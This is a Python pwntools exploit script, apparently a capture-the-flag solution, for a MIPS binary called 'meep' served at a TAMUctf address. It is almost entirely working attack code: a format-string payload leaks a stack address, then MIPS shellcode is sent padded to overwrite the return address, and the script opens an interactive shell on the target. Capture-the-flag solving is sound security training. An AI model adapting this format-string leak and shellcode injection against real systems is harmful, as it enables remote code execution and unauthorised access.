#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./meep")
#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a):
    return info(": ".join([n, hex(a)]))


s = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
r = lambda num=4096: p.recv(num)
rl = lambda: p.recvline()
ru = lambda delim, drop=True: p.recvuntil(delim, drop)
l64 = lambda: u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))

if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="meep")
    libc = ELF("./lib-mips/libc.so.6")  # or other exact path
else:
    p = remote("localhost", 9001)
    libc = ELF("./lib-mips/libc.so.6")

# test
#for i in range(6, 20):
#    p = remote("localhost", 9001)
#    sa(b'Enter admin name:', f'%{i}$p'.encode())
#    
#    ru(b'Hello:\n\n')
#    a = ru(b'Enter diag')
#    print(a.decode().split())
#    p.close()

fmt = b'%12$p'
sa(b'Enter admin name:', fmt)

ru(b'Hello:\n\n')
a = ru(b'Enter diag')
slog("leak", int(a.split()[0][:10].decode(), 16))

cmd = int(a.split()[0][:10].decode(), 16) + -144
slog("cmd[128]", cmd)

sc = asm(shellcraft.mips.linux.sh())

s(sc.ljust(140)+p32(cmd))

p.interactive()
